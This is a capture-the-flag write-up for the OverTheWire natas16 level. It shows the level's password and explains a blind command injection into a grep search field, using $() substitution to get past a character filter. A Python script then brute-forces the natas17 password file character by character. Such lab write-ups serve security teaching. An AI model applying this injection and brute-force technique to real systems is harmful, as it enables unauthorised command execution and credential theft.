## Username
natas16

## Password
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

## Write-Up
<img width="393" height="231" alt="image" src="https://github.com/user-attachments/assets/d31c1498-8ebc-45ce-882d-1bedf2c27466" />

We can know that source code have grep command that we can use grep command injection.  
But there is a limitation that /[;|&`\'"] is can't be used.    
We should use command substitution for $() syntax.  
<img width="107" height="70" alt="image" src="https://github.com/user-attachments/assets/528c0535-3ccc-44e7-a931-8ee3ca5a2087" />

Output when submitting university  
If we submit university$(grep a /etc/natas_webpass/natas17), there are no output results.  
It means, the result of grep is printed, the value of needle is changed for university+password.  
In addition, using grep a^, we can find text only started with a.  
In this way, we are going to script brute-force file for using this logic.

```python
import requests
import string

username='natas16'
password='hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
url='http://natas16.natas.labs.overthewire.org'
charset=string.ascii_letters+string.digits
result=''

for i in range(32):
    for char in charset:
        print(f"Current char = {char}")
        response=requests.post(url,auth=(username,password),
                               data={"needle":"university$(grep ^"+result+char+".* /etc/natas_webpass/natas17)"})
        if "university" not in response.text:
            result+=char
            print(result)
            break;
```

## Method of solve
Blind Command Injection using Command Substitution Injection  
Meaning of ^(Caret symbol) in grep
